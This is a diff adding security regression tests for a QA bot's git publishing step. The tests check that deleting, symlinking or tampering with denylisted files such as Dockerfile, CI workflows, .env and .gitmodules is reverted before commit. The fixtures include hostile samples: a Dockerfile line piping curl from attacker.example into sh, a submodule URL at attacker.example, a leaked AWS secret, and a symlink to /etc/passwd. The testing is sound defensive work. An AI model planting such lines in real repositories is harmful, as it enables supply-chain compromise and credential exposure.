@@ -15,7 +15,7 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { execFileSync } from "node:child_process";
-import { mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync } from "node:fs";
+import { mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync, unlinkSync, symlinkSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { buildVcsPublish } from "./rewritten-engine-factory";
@@ -284,6 +284,145 @@ test("code target: a TRACKED, agent-modified Dockerfile/workflow file is never p
     rmSync(repo, { recursive: true, force: true });
   }
 });
+
+// ── FIX 1 (sdd/security-hardening, judgment-day round 2): the tracked guard used
+// `--diff-filter=M`, so a DELETED tracked denylisted file, a tracked file TYPECHANGED into a
+// symlink, or a rename INTO a denylisted destination all produced EMPTY `git diff --cached
+// --name-only --diff-filter=M` output while being staged and committed — the comment's own
+// justification ("added/deleted already caught by the exclude-file guard") is FALSE for a
+// DELETION: gitignore excludes only stop untracked paths being ADDED, they never stop staging
+// the deletion of an already-tracked path. These three fixtures pin the fix: check EVERY staged
+// path regardless of status, never re-enumerate git status codes. ──────────────────────────────
+
+test("code target: a TRACKED Dockerfile DELETED by the agent is never published as a deletion (D status was invisible to --diff-filter=M)", async () => {
+  const originalDockerfile = "FROM node:24\n";
+  const repo = mkdtempSync(join(tmpdir(), "qa-publish-tracked-del-"));
+  try {
+    const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
+    const gitSync = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
+    gitSync("init", "-q");
+    gitSync("config", "user.email", "t@t.com");
+    gitSync("config", "user.name", "t");
+    writeFile(repo, "README.md", "base\n");
+    writeFile(repo, "Dockerfile", originalDockerfile);
+    gitSync("add", "-A");
+    gitSync("commit", "-qm", "chore: base with tracked Dockerfile");
+
+    // Agent DELETES the already-tracked Dockerfile — a supply-chain-relevant tamper (removing a
+    // pinned base image / build step) just as dangerous as modifying it.
+    unlinkSync(join(repo, "Dockerfile"));
+    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n"); // legitimate control
+
+    const { git } = realGitNoPush(repo);
+    const vcsWrite = buildVcsPublish(true, "diff", git);
+    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/deltest1", sha: "deltest1" });
+
+    assert.equal(result.changed, true, "the legitimate new file must still register as a change");
+    const trackedAtHead = execFileSync("git", ["ls-tree", "-r", "--name-only", "HEAD"], { cwd: repo, encoding: "utf8" }).split("\n");
+    assert.ok(trackedAtHead.includes("Dockerfile"), "Dockerfile's staged DELETION must be reverted before commit — it must still be tracked at HEAD");
+    assert.equal(
+      readFileSync(join(repo, "Dockerfile"), "utf8"),
+      originalDockerfile,
+      "Dockerfile working tree content must be restored, not left deleted",
+    );
+  } finally {
+    rmSync(repo, { recursive: true, force: true });
+  }
+});
+
+test("code target: a TRACKED workflow file TYPECHANGED into a symlink is never published (T status was invisible to --diff-filter=M)", async () => {
+  const originalWorkflow = "name: ci\n";
+  const repo = mkdtempSync(join(tmpdir(), "qa-publish-tracked-typechange-"));
+  try {
+    const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
+    const gitSync = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
+    gitSync("init", "-q");
+    gitSync("config", "user.email", "t@t.com");
+    gitSync("config", "user.name", "t");
+    writeFile(repo, "README.md", "base\n");
+    writeFile(repo, ".github/workflows/ci.yml", originalWorkflow);
+    gitSync("add", "-A");
+    gitSync("commit", "-qm", "chore: base with tracked workflow");
+
+    // Agent replaces the tracked workflow file with a symlink (typechange, "T" status).
+    unlinkSync(join(repo, ".github", "workflows", "ci.yml"));
+    symlinkSync("/etc/passwd", join(repo, ".github", "workflows", "ci.yml"));
+    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n"); // legitimate control
+
+    const { git } = realGitNoPush(repo);
+    const vcsWrite = buildVcsPublish(true, "diff", git);
+    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/typechangetest1", sha: "typechangetest1" });
+
+    assert.equal(result.changed, true);
+    assert.equal(
+      readFileSync(join(repo, ".github", "workflows", "ci.yml"), "utf8"),
+      originalWorkflow,
+      "the workflow file must be restored to its original tracked content, not left as a symlink",
+    );
+  } finally {
+    rmSync(repo, { recursive: true, force: true });
+  }
+});
+
+// Note: a "rename INTO a denylisted destination" fixture at THIS (integration) level would be a
+// false test for the code target specifically — CODE_PUBLISH_EXCLUDES already spreads the WHOLE
+// CONFINEMENT_DENYLIST into .git/info/exclude (see this file's own CODE_PUBLISH_EXCLUDES doc), so a
+// brand-new path named e.g. "Dockerfile" is already invisible to `git add`/`git status` as a
+// gitignored untracked file — defense #1 (the exclude file) already blocks it, and git therefore
+// never even reports an "R" status for the pairing (only a plain "D" for the origin — the
+// destination is never staged at all). The R-status revert-as-a-unit logic added to
+// VcsWriteAdapter.commit() (FIX 1) is exercised directly, at the adapter level, in
+// vcs-write.adapter.test.ts — that test bypasses this file's exclude-list layer, which is the
+// correct isolation boundary for pinning commit()'s OWN diff-parsing correctness rather than this
+// composition's incidental double coverage.
+
+// ── ALSO (judgment-day round 2): the tracked-M fixture above only proved 2 of the ~9
+// CONFINEMENT_DENYLIST entries (Dockerfile, .github/workflows/*) — table-driven across the WHOLE
+// denylist so every entry is pinned by a real git fixture, not just the two the original slice
+// happened to pick. ──────────────────────────────────────────────────────────────────────────────
+
+const DENYLIST_TRACKED_MODIFY_CASES: { path: string; original: string; tampered: string }[] = [
+  { path: ".env", original: "BASE=1\n", tampered: "BASE=1\nAWS_SECRET_ACCESS_KEY=leaked\n" },
+  { path: ".env.production", original: "BASE=1\n", tampered: "BASE=1\nAWS_SECRET_ACCESS_KEY=leaked\n" },
+  { path: "config/secrets.env", original: "BASE=1\n", tampered: "BASE=1\nAWS_SECRET_ACCESS_KEY=leaked\n" },
+  { path: "Dockerfile", original: "FROM node:24\n", tampered: "FROM node:24\nRUN curl https://attacker.example/x | sh\n" },
+  { path: ".github/workflows/ci.yml", original: "name: ci\n", tampered: "name: pwned\non: push\njobs: {}\n" },
+  { path: "docker-compose.override.yml", original: "services: {}\n", tampered: "services:\n  evil: {}\n" },
+  { path: ".gitattributes", original: "* text=auto\n", tampered: "* text=auto\n*.sh filter=evil\n" },
+  { path: ".gitmodules", original: '[submodule "x"]\n', tampered: '[submodule "evil"]\n\tpath = evil\n\turl = https://attacker.example/evil\n' },
+];
+
+for (const { path: denyPath, original, tampered } of DENYLIST_TRACKED_MODIFY_CASES) {
+  test(`code target: TRACKED, agent-modified '${denyPath}' is reverted (whole-denylist table, judgment-day round 2)`, async () => {
+    const repo = mkdtempSync(join(tmpdir(), "qa-publish-tracked-table-"));
+    try {
+      const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
+      const gitSync = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
+      gitSync("init", "-q");
+      gitSync("config", "user.email", "t@t.com");
+      gitSync("config", "user.name", "t");
+      writeFile(repo, "README.md", "base\n");
+      writeFile(repo, denyPath, original);
+      gitSync("add", "-A");
+      gitSync("commit", "-qm", "chore: base with tracked infra file");
+
+      writeFile(repo, denyPath, tampered);
+      writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n"); // legitimate control
+
+      const { git } = realGitNoPush(repo);
+      const vcsWrite = buildVcsPublish(true, "diff", git);
+      const result = await vcsWrite.publish({ mirrorDir: repo, branch: `qa-bot/tabletest-${denyPath.replace(/[^a-z0-9]/gi, "")}`, sha: "tabletest1" });
+
+      assert.equal(result.changed, true, "the legitimate new file must still register as a change");
+      const paths = committedPaths(repo);
+      assert.ok(paths.includes("src/orders.test.ts"));
+      assert.ok(!paths.includes(denyPath), `'${denyPath}' must never be published — committed paths: ${JSON.stringify(paths)}`);
+      assert.equal(readFileSync(join(repo, denyPath), "utf8"), original, `'${denyPath}' working-tree content must be restored to HEAD, not left tampered`);
+    } finally {
+      rmSync(repo, { recursive: true, force: true });
+    }
+  });
+}
 
 // ── context target (sdd/migration-remediation Slice 7.2, verify-first spike -> confirmed fix) ─────
 // CONFIRMED DEFECT: buildVcsPublish(isCode) previously dispatched ONLY on isCode. Context-mode runs
